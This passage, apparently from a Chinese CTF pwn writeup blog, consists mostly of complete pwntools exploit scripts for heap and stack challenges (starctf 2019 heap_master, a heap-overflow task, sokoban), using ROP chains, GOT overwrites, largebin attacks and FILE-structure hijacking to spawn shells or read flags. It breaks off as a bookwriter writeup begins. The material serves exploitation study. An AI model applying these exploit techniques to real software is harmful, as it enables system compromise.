class="line">Create(<span class="number">0x20</span>,payload+<span class="string">'\x00'</span>)    </span><br><span class="line">Delete(<span class="number">1</span>)</span><br><span class="line">sh.recvuntil(<span class="number">0x18</span>*<span class="string">'a'</span>)</span><br><span class="line">text_addr = u64(sh.recvuntil(<span class="string">"\n"</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0xd0b</span></span><br><span class="line">log.success(<span class="string">"text_addr: "</span> + hex(text_addr))</span><br><span class="line"></span><br><span class="line">pop_rdi = text_addr + <span class="number">0x11d3</span></span><br><span class="line">puts_plt = text_addr + elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">atoi_got = text_addr + elf.got[<span class="string">'atoi'</span>]</span><br><span class="line">main_addr = text_addr + <span class="number">0xBCA</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#把那个函数指针pop_pop_pop_pop_ret，然后在输入yes的那个地方其实在栈上输入挺多的，可以构造rop链</span></span><br><span class="line"><span class="comment">#泄露libc地址</span></span><br><span class="line">Create(<span class="number">4</span>,<span class="string">'a'</span>*<span class="number">4</span>+<span class="string">'\x00'</span>)   <span class="comment">#1</span></span><br><span class="line">Create(<span class="number">4</span>,<span class="string">'b'</span>*<span class="number">4</span>+<span class="string">'\x00'</span>)   <span class="comment">#2</span></span><br><span class="line">Delete(<span class="number">2</span>)</span><br><span class="line">Delete(<span class="number">1</span>)</span><br><span class="line">ropchain = <span class="number">0x18</span>*<span class="string">'a'</span></span><br><span class="line">ropchain += p64(text_addr + <span class="number">0x11cc</span>)</span><br><span class="line">Create(<span class="number">0x21</span>,ropchain+<span class="string">'\x00'</span>)  </span><br><span class="line"></span><br><span class="line">payload = <span class="string">'yes '</span> + <span class="string">'a'</span>*<span class="number">4</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(atoi_got)</span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line">payload += p64(main_addr)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">"3.quit\n"</span>)</span><br><span class="line">sh.sendline(<span class="string">"delete "</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"Pls give me the string id you want to delete\nid:"</span>)</span><br><span class="line">sh.sendline(str(<span class="number">2</span>))</span><br><span class="line">sh.recvuntil(<span class="string">"Are you sure?:"</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">libc_addr = u64(sh.recvuntil(<span class="string">"\n"</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x36e80</span></span><br><span class="line">log.success(<span class="string">'libc_addr: '</span>+ hex(libc_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#再次构造rop链拿到shell</span></span><br><span class="line">Create(<span class="number">4</span>,<span class="string">'a'</span>*<span class="number">4</span>+<span class="string">'\x00'</span>)   <span class="comment">#1</span></span><br><span class="line">Create(<span class="number">4</span>,<span class="string">'b'</span>*<span class="number">4</span>+<span class="string">'\x00'</span>)   <span class="comment">#2</span></span><br><span class="line">Delete(<span class="number">3</span>)</span><br><span class="line">Delete(<span class="number">2</span>)</span><br><span class="line">ropchain = <span class="number">0x18</span>*<span class="string">'a'</span></span><br><span class="line">ropchain += p64(text_addr + <span class="number">0x11cc</span>)</span><br><span class="line">Create(<span class="number">0x21</span>,ropchain+<span class="string">'\x00'</span>) </span><br><span class="line"></span><br><span class="line">system_addr = libc_addr + <span class="number">0x45390</span></span><br><span class="line">binsh_addr = libc_addr + <span class="number">0x18cd57</span></span><br><span class="line">payload = <span class="string">'yes '</span> + <span class="string">'a'</span>*<span class="number">4</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">"3.quit\n"</span>)</span><br><span class="line">sh.sendline(<span class="string">"delete "</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"Pls give me the string id you want to delete\nid:"</span>)</span><br><span class="line">sh.sendline(<span class="string">'3'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"Are you sure?:"</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">##一些有用的gdb调试命令</span></span><br><span class="line"><span class="comment">## heapinfo</span></span><br><span class="line"><span class="comment">## tracemalloc on</span></span><br></pre></td></tr></table></figure>

<h3 id="starctf-2019-heap-master"><a href="#starctf-2019-heap-master" class="headerlink" title="starctf 2019 heap_master"></a>starctf 2019 heap_master</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.update(os=<span class="string">"linux"</span>,arch=<span class="string">"amd64"</span>)</span><br><span class="line"><span class="meta">#context.log_level = <span class="meta-string">"debug"</span></span></span><br><span class="line">context.aslr = False</span><br><span class="line">libc = ELF('./libc-2.23.so')</span><br><span class="line"></span><br><span class="line"><span class="function">def <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">    p.recvuntil("&gt;&gt; ")</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"size: "</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function">def <span class="title">edit</span><span class="params">(idx,data)</span>:</span></span><br><span class="line">    p.recvuntil("&gt;&gt; ")</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"offset: "</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">"size: "</span>)</span><br><span class="line">    p.sendline(str(len(data)))</span><br><span class="line">    p.recvuntil(<span class="string">"content: "</span>)</span><br><span class="line">    p.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function">def <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil("&gt;&gt; ")</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"offset: "</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function">def <span class="title">g</span><span class="params">(offset)</span>:</span></span><br><span class="line">    return libc_address + offset</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x8060</span></span><br><span class="line"><span class="built_in">stdout</span> = <span class="number">0x5620</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#p = remote('node3.buuoj.cn',27255)</span><br><span class="line">p = process('./starctf_2019_heap_master', env=&#123;"LD_PRELOAD":"./libc-2.23.so"&#125;)</span><br><span class="line">#<span class="meta">#chunk:0x330 0x30</span></span><br><span class="line">edit(offset+<span class="number">0x8</span>,p64(<span class="number">0x331</span>)) #<span class="number">1</span></span><br><span class="line">edit(offset+<span class="number">0x8</span>+<span class="number">0x330</span>,p64(<span class="number">0x31</span>))</span><br><span class="line">#<span class="meta">#chunk 0x410 0x30</span></span><br><span class="line">edit(offset+<span class="number">0x8</span>+<span class="number">0x360</span>,p64(<span class="number">0x411</span>)) #<span class="number">2</span></span><br><span class="line">edit(offset+<span class="number">0x8</span>+<span class="number">0x360</span>+<span class="number">0x410</span>,p64(<span class="number">0x31</span>))</span><br><span class="line">#<span class="meta">#chunk 0x410 0x30 0x30</span></span><br><span class="line">edit(offset+<span class="number">0x8</span>+<span class="number">0x360</span>+<span class="number">0x440</span>,p64(<span class="number">0x411</span>)) #<span class="number">3</span></span><br><span class="line">edit(offset+<span class="number">0x8</span>+<span class="number">0x360</span>+<span class="number">0x440</span>+<span class="number">0x410</span>,p64(<span class="number">0x31</span>))</span><br><span class="line">edit(offset+<span class="number">0x8</span>+<span class="number">0x360</span>+<span class="number">0x440</span>+<span class="number">0x440</span>,p64(<span class="number">0x31</span>))</span><br><span class="line"></span><br><span class="line">#<span class="meta">#unsorted bin:0x410(2)-&gt;0x330(1)</span></span><br><span class="line"><span class="keyword">delete</span>(offset+<span class="number">0x10</span>) #<span class="number">1</span> <span class="number">0x330</span></span><br><span class="line"><span class="keyword">delete</span>(offset+<span class="number">0x10</span>+<span class="number">0x360</span>) #<span class="number">2</span> <span class="number">0x410</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#<span class="meta">#unsorted bin:0x330-0xa0=0x290</span></span><br><span class="line">#<span class="meta">#largebin:0x410 chunk 2</span></span><br><span class="line">add(<span class="number">0x90</span>) #<span class="number">0xa0</span></span><br><span class="line">#<span class="meta">#edit size + fd + bk</span></span><br><span class="line">edit(offset+<span class="number">0x8</span>+<span class="number">0x360</span>,p64(<span class="number">0x101</span>)*<span class="number">3</span>) #<span class="number">2</span> size+fd+bk</span><br><span class="line">edit(offset+<span class="number">0x8</span>+<span class="number">0x460</span>,p64(<span class="number">0x101</span>)*<span class="number">3</span>) <span class="meta">#chunk 2 + 0x100</span></span><br><span class="line">edit(offset+<span class="number">0x8</span>+<span class="number">0x560</span>,p64(<span class="number">0x101</span>)*<span class="number">3</span>) <span class="meta">#chunk 2 + 0x200</span></span><br><span class="line"></span><br><span class="line">#<span class="meta">#unsorted bin:0x60(chunk 2-0xa0)</span></span><br><span class="line">#<span class="meta">#smallbin:0x60(chunk 2+0x10-0xa0)</span></span><br><span class="line">#<span class="meta">#smallbin:0x290</span></span><br><span class="line">#<span class="meta">#largebin:chunk 2</span></span><br><span class="line"><span class="keyword">delete</span>(offset+<span class="number">0x10</span>+<span class="number">0x370</span>) #<span class="number">0x100</span> <span class="built_in">free</span> (chunk <span class="number">2</span>+<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x90</span>) #(chunk <span class="number">2</span> + <span class="number">0x10</span>)<span class="number">-0xa0</span></span><br><span class="line"><span class="keyword">delete</span>(offset+<span class="number">0x10</span>+<span class="number">0x360</span>) #<span class="number">0x100</span> <span class="built_in">free</span> (chunk <span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x90</span>) <span class="meta">#chunk 2-0xa0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#gdb.attach(p)</span></span><br><span class="line">#<span class="meta">#largebin attack</span></span><br><span class="line">#<span class="meta">#fwd-&gt;bk = stdout - 0x10</span></span><br><span class="line">#<span class="meta">#fwd-&gt;bk_next_size = stdout+0x19-0x20</span></span><br><span class="line">#<span class="meta">#stdout-&gt;victim</span></span><br><span class="line">#<span class="meta">#stdout+0x19-&gt;victim</span></span><br><span class="line">##(flag &amp; <span class="number">0xa00</span>) <span class="keyword">and</span> (flag &amp; <span class="number">0x1000</span> == <span class="number">1</span>) <span class="keyword">and</span> (flag)</span><br><span class="line">##_IO_write_base(<span class="built_in">stdout</span>+<span class="number">0x20</span>) partial write <span class="number">0x00</span></span><br><span class="line">edit(offset+<span class="number">0x8</span>+<span class="number">0x360</span>,p64(<span class="number">0x3f1</span>)+p64(<span class="number">0</span>)+p16(<span class="built_in">stdout</span><span class="number">-0x10</span>)) <span class="meta">#chunk 2-&gt;bk</span></span><br><span class="line">edit(offset+<span class="number">0x8</span>+<span class="number">0x360</span>+<span class="number">0x18</span>,p64(<span class="number">0</span>)+p16(<span class="built_in">stdout</span>+<span class="number">0x19</span><span class="number">-0x20</span>)) <span class="meta">#chunk 2-&gt;bk_nextsize</span></span><br><span class="line"><span class="keyword">delete</span>(offset+<span class="number">0x10</span>+<span class="number">0x360</span>+<span class="number">0x440</span>) <span class="meta">#free chunk 3(0x410)</span></span><br><span class="line">add(<span class="number">0x90</span>)</span><br><span class="line">one = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">p.recvn(<span class="number">0x18</span>)</span><br><span class="line">leak_addr = u64(p.recvn(<span class="number">8</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc_address = leak_addr - <span class="number">0x3c36e0</span></span><br><span class="line">heap_base = u64(p.recvn(<span class="number">8</span>)) - <span class="number">0x880</span></span><br><span class="line">log.success('lead_addr: ' + hex(leak_addr))</span><br><span class="line">log.success('libc_base: ' + hex(libc_address))</span><br><span class="line">log.success('heap_base: ' + hex(heap_base))</span><br><span class="line">offset = <span class="number">0x100</span></span><br><span class="line">edit(offset+<span class="number">0x8</span>,p64(<span class="number">0x331</span>)) #<span class="number">1</span></span><br><span class="line">edit(offset+<span class="number">0x8</span>+<span class="number">0x330</span>,p64(<span class="number">0x31</span>))</span><br><span class="line">edit(offset+<span class="number">0x8</span>+<span class="number">0x360</span>,p64(<span class="number">0x511</span>)) #<span class="number">2</span></span><br><span class="line">edit(offset+<span class="number">0x8</span>+<span class="number">0x360</span>+<span class="number">0x510</span>,p64(<span class="number">0x31</span>))</span><br><span class="line">edit(offset+<span class="number">0x8</span>+<span class="number">0x360</span>+<span class="number">0x540</span>,p64(<span class="number">0x511</span>)) #<span class="number">3</span></span><br><span class="line">edit(offset+<span class="number">0x8</span>+<span class="number">0x360</span>+<span class="number">0x540</span>+<span class="number">0x510</span>,p64(<span class="number">0x31</span>))</span><br><span class="line">edit(offset+<span class="number">0x8</span>+<span class="number">0x360</span>+<span class="number">0x540</span>+<span class="number">0x540</span>,p64(<span class="number">0x31</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">delete</span>(offset+<span class="number">0x10</span>) #<span class="number">1</span> <span class="number">0x330</span></span><br><span class="line"><span class="keyword">delete</span>(offset+<span class="number">0x10</span>+<span class="number">0x360</span>) #<span class="number">2</span> <span class="number">0x510</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">##edit chunk <span class="number">2</span> <span class="number">0x4f0</span></span><br><span class="line">##fwd-&gt;bk = io_list_all - <span class="number">0x10</span></span><br><span class="line">##ffwd-&gt;bk_nextsize = io_list_all - <span class="number">0x20</span></span><br><span class="line">edit(offset+<span class="number">0x8</span>+<span class="number">0x360</span>,p64(<span class="number">0x4f1</span>)+p64(<span class="number">0</span>)+p64(libc.symbols[<span class="string">"_IO_list_all"</span>]<span class="number">-0x10</span>))</span><br><span class="line">edit(offset+<span class="number">0x8</span>+<span class="number">0x360</span>+<span class="number">0x18</span>,p64(<span class="number">0</span>)+p64(libc.symbols[<span class="string">"_IO_list_all"</span>]<span class="number">-0x20</span>))</span><br><span class="line"></span><br><span class="line">##unsorted bin:<span class="number">0x510</span></span><br><span class="line">##smallbin:<span class="number">0x330</span></span><br><span class="line">##largebin:<span class="number">0x3f0</span> <span class="number">0x4f0</span></span><br><span class="line">##io_list_all -&gt; victim (chunk <span class="number">3</span> <span class="number">0x510</span>)</span><br><span class="line"><span class="keyword">delete</span>(offset+<span class="number">0x10</span>+<span class="number">0x360</span>+<span class="number">0x540</span>) #<span class="number">3</span> <span class="number">0x510</span></span><br><span class="line">add(<span class="number">0x200</span>)</span><br><span class="line">_IO_str_jump = p64(libc_address + (<span class="number">0x7ffff7dd07a0</span><span class="number">-0x00007ffff7a0d000</span>))</span><br><span class="line">#pp_j = g(<span class="number">0x12d80d</span>)  #pop rbx;pop rbp;jmp rdx</span><br><span class="line">pp_j = g(one[<span class="number">1</span>])</span><br><span class="line">p_rsp_r = g(<span class="number">0x03838</span>) #pop rsp;ret</span><br><span class="line">p_rsp_r13_r = g(<span class="number">0x206d3</span>) #pop rsp;pop r13;ret</span><br><span class="line">p_rdi_r = g(<span class="number">0x21112</span>) #pop rdi;ret</span><br><span class="line">p_rdx_rsi_r = g(<span class="number">0x115189</span>) #pop rdx;pop rsi;re</span><br><span class="line">fake_IO_strfile = p64(<span class="number">0</span>) + p64(p_rsp_r)</span><br><span class="line">fake_IO_strfile += p64(heap_base+<span class="number">8</span>) + p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_strfile += p64(<span class="number">0</span>) + p64(p_rsp_r13_r)</span><br><span class="line">##rbx=rdi-&gt;fake IO_list_all(offset+<span class="number">0x360</span>+<span class="number">0x540</span>)</span><br><span class="line">##mov rdx,[rdi+<span class="number">0x28</span>] -&gt; p_rsp_r13_r</span><br><span class="line">##call QWORD PTR [rbx+<span class="number">0xe0</span>] - &gt; call [offset+<span class="number">0x360</span>+<span class="number">0x540</span>+<span class="number">0xe0</span>] -&gt; pp_j</span><br><span class="line">##pp_j -&gt; jmp rdx -&gt; p_rsp_r13_r</span><br><span class="line">fake_IO_strfile = p64(<span class="number">0</span>) + p64(p_rsp_r)</span><br><span class="line">fake_IO_strfile += p64(heap_base+<span class="number">8</span>) + p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_strfile += p64(<span class="number">0</span>) + p64(p_rsp_r13_r)</span><br><span class="line"></span><br><span class="line">orw = [</span><br><span class="line">   p_rdi_r,heap_base,</span><br><span class="line">   p_rdx_rsi_r, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">   libc.symbols[<span class="string">"open"</span>],</span><br><span class="line">   p_rdi_r, <span class="number">3</span>,</span><br><span class="line">   p_rdx_rsi_r, <span class="number">0x100</span>, heap_base+<span class="number">0x1337</span>,</span><br><span class="line">   libc.symbols[<span class="string">"read"</span>],</span><br><span class="line">   p_rdi_r, <span class="number">1</span>,</span><br><span class="line">   p_rdx_rsi_r, <span class="number">0x100</span>, heap_base+<span class="number">0x1337</span>,</span><br><span class="line">   libc.symbols[<span class="string">"write"</span>],</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">edit(0,'./flag\x00\x00'+flat(orw))</span><br><span class="line">edit(offset+<span class="number">0x360</span>+<span class="number">0x540</span>,fake_IO_strfile)</span><br><span class="line">##io_list_all+<span class="number">0xd8</span>:vtable</span><br><span class="line">edit(offset+<span class="number">0x360</span>+<span class="number">0x540</span>+<span class="number">0xd8</span>,_IO_str_jump)</span><br><span class="line">edit(offset+<span class="number">0x360</span>+<span class="number">0x540</span>+<span class="number">0xe0</span>,p64(pp_j))</span><br><span class="line"><span class="meta">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt; "</span>,<span class="string">'0'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt; "</span>,<span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="baby堆风水"><a href="#baby堆风水" class="headerlink" title="baby堆风水"></a>baby堆风水</h3><p>没看出来有什么特别的，就挺简单的一个堆溢出，然后用got泄露，修改free_got然后直接打就可以了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(argv)==<span class="number">3</span>:</span><br><span class="line">    ip,port=argv[<span class="number">1</span>],int(argv[<span class="number">2</span>])</span><br><span class="line">    io=remote(ip,port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io=process(<span class="string">'./pwn'</span>)</span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">"./pwn"</span>)</span><br><span class="line">libc = ELF(<span class="string">"libc-2.23.so"</span>)</span><br><span class="line"><span class="comment">#context.log_level = "debug"</span></span><br><span class="line"><span class="comment">#context.terminal = ["/usr/bin/tmux", "splitw", "-h", "-p", "70"]</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">    gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_user</span><span class="params">(description_size, name, text_len, text)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"Action: "</span>)</span><br><span class="line">    io.sendline(<span class="string">"0"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"size of description: "</span>)</span><br><span class="line">    io.sendline(str(description_size))</span><br><span class="line">    io.recvuntil(<span class="string">"name: "</span>)</span><br><span class="line">    io.sendline(name)</span><br><span class="line">    io.recvuntil(<span class="string">"text length: "</span>)</span><br><span class="line">    io.sendline(str(text_len))</span><br><span class="line">    io.recvuntil(<span class="string">"text: "</span>)</span><br><span class="line">    io.sendline(text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_user</span><span class="params">(index)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"Action: "</span>)</span><br><span class="line">    io.sendline(<span class="string">"1"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"index: "</span>)</span><br><span class="line">    io.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">display</span><span class="params">(index)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"Action: "</span>)</span><br><span class="line">    io.sendline(<span class="string">"2"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"index: "</span>)</span><br><span class="line">    io.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span><span class="params">(index, text_len, text)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"Action: "</span>)</span><br><span class="line">    io.sendline(<span class="string">"3"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"index: "</span>)</span><br><span class="line">    io.sendline(str(index))</span><br><span class="line">    io.recvuntil(<span class="string">"text length: "</span>)</span><br><span class="line">    io.sendline(str(text_len))</span><br><span class="line">    io.recvuntil(<span class="string">"text: "</span>)</span><br><span class="line">    io.sendline(text)</span><br><span class="line"></span><br><span class="line">add_user(<span class="number">0x10</span>, <span class="string">"aaa"</span>, <span class="number">0x10</span>, <span class="string">"bbb"</span>) <span class="comment">#index0</span></span><br><span class="line">add_user(<span class="number">0x10</span>, <span class="string">"aaa"</span>, <span class="number">0x10</span>, <span class="string">"bbb"</span>) <span class="comment">#index1</span></span><br><span class="line">add_user(<span class="number">0x10</span>, <span class="string">"aaa"</span>, <span class="number">0x10</span>, <span class="string">"/bin/bash\x00"</span>) <span class="comment">#index2</span></span><br><span class="line">delete_user(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">free_got = e.got[<span class="string">"free"</span>]</span><br><span class="line">payload = <span class="number">128</span>*<span class="string">"a"</span> + p32(<span class="number">0x0</span>) + p32(<span class="number">0x19</span>) + <span class="string">"\x00"</span>*<span class="number">20</span> + p32(<span class="number">0x89</span>) + p32(free_got)</span><br><span class="line">add_user(<span class="number">0x80</span>, <span class="string">"aaa"</span>, len(payload), payload) <span class="comment">#index3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">display(<span class="number">1</span>)</span><br><span class="line">io.recvuntil(<span class="string">"description: "</span>)</span><br><span class="line">free_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="comment">#libc_addr = free_addr - libc.symbols["free"]</span></span><br><span class="line">libc_addr = free_addr - <span class="number">0x00070750</span></span><br><span class="line">print(<span class="string">"func address: "</span> + hex(free_addr))</span><br><span class="line">print(<span class="string">"libc address: "</span> + hex(libc_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#get shell</span></span><br><span class="line"><span class="comment">#system_addr = libc_addr + libc.symbols["system"]</span></span><br><span class="line">system_addr = libc_addr + <span class="number">0x03a940</span></span><br><span class="line">payload = p32(system_addr)</span><br><span class="line">update(<span class="number">1</span>, len(payload), payload)</span><br><span class="line"></span><br><span class="line">delete_user(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="sogan"><a href="#sogan" class="headerlink" title="sogan"></a>sogan</h3><p>简单栈溢出加orw，记录一下orw模板以及一个查libc的网站<br><a href="https://libc.rip/" target="_blank" rel="noopener">https://libc.rip/</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"><span class="comment">#sh = remote('172.50.35.72',6666)</span></span><br><span class="line">sh  = process(<span class="string">'./sokoban'</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./sokoban'</span>)</span><br><span class="line"><span class="comment">#libc = ELF('./libc6_2.7-10ubuntu3_amd64.so')</span></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(sh, <span class="string">'b*0x400EF0'</span>)</span><br><span class="line">puts_plt = <span class="number">0x400640</span> </span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400f63</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x0000000000400f61</span></span><br><span class="line">leave_ret = <span class="number">0x400EEF</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'da'</span>*<span class="number">0x300</span> + <span class="string">b'ddwwwwssdwwssassdwwwsssdww'</span></span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'Hero,Please leave your name:'</span>)</span><br><span class="line"></span><br><span class="line">fake_ebp = <span class="number">0x602500</span></span><br><span class="line"></span><br><span class="line">init_gad1 = <span class="number">0x400F5A</span></span><br><span class="line">init_gad2 = <span class="number">0x400F40</span></span><br><span class="line"></span><br><span class="line">binsh_addr = <span class="number">0x602018</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'a'</span>*<span class="number">0x130</span> + p64(fake_ebp)</span><br><span class="line">payload += p64(pop_rdi) + p64(elf.got[<span class="string">'puts'</span>]) + p64(puts_plt) + p64(init_gad1)</span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(elf.got[<span class="string">'read'</span>]) + p64(<span class="number">0</span>) + p64(fake_ebp) + p64(<span class="number">0x100</span>) + p64(init_gad2)</span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(fake_ebp) + p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">payload += p64(leave_ret)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">libc_base = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>)) - libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">log.success(<span class="string">'libc_base: '</span> + hex(libc_base))</span><br><span class="line"></span><br><span class="line">Open = libc_base + libc.sym[<span class="string">'open'</span>]</span><br><span class="line">Read  = elf.plt[<span class="string">'read'</span>]</span><br><span class="line">Write = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line">pop_rdx = libc_base + next(libc.search(asm(<span class="string">'pop rdx; ret;'</span>)))</span><br><span class="line">pop_rax = libc_base + next(libc.search(asm(<span class="string">'pop rax; ret;'</span>)))</span><br><span class="line">syscall = libc_base + <span class="number">0x00000000000630d9</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'./flag\x00\x00'</span></span><br><span class="line">payload += p64(pop_rdi) + p64(fake_ebp)</span><br><span class="line">payload += p64(pop_rsi_r15) + p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload += p64(pop_rax) + p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(pop_rsi_r15) + p64(fake_ebp+<span class="number">0x200</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(Read)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(fake_ebp + <span class="number">0x200</span>)</span><br><span class="line">payload += p64(Write) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn题writeup</category>
      </categories>
      <tags>
        <tag>堆</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable-tw bookwriter</title>
    <url>/year/02/19/cl7iordpt003d293f8sm1c5l1/</url>
    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>主要是一道house of orange，利用方法很经典，学习了</p>
<a id="more"></a>
<h2 id="0x01-题目分析"><a href="#0x01-题目分析" class="headerlink" title="0x01 题目分析"></a>0x01 题目分析</h2><h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome to the BookWriter !"</span>);</span><br><span class="line">  sub_400BDF();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    <span class="keyword">switch</span> ( get_num() )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1L</span>L:</span><br><span class="line">        add();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2L</span>L:</span><br><span 